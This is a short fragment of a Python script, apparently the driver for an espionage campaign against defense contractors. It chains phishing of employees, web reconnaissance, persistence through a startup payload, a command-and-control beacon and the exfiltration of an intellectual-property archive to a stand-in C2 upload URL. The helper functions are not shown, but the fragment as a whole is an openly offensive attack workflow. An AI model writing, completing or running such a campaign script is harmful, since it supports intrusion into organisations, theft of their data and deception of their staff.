...
def main():
    """
    Main function to run the defense_contractor_campaign campaign.
    """
    print(f"[*] Starting defense_contractor_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("defense_contractors_employees.txt")
    run_tool("apt_web_recon.js", "--target defense_contractors.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/intellectual_property_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-DEFENSE_CONTRACTORS-01")
    ...
    exfiltration.exfiltrate_data("intellectual_property/intellectual_property.zip", "https://c2.example.com/upload")
    run_tool("payloads/intellectual_property_exfiltrator.py")
